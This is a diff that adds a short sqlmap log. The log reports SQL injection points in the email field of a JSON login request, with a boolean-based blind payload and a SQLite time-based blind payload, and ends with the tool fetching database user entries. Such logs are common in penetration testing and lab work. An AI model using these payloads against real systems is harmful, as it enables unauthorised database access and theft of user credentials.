@@ -1,0 +1,12 @@
+sqlmap identified the following injection point(s) with a total of 56 HTTP(s) requests:
+---
+Parameter: email (JSON)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"email":"*" AND 1=1","password":"test"}
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: {"email":"*" AND 6428=LIKE('ABCDEFG',UPPER(HEX(RANDOMBYTES(500000000))))","password":"test"}
+---
+[13:00:10] [INFO] fetching database user entries
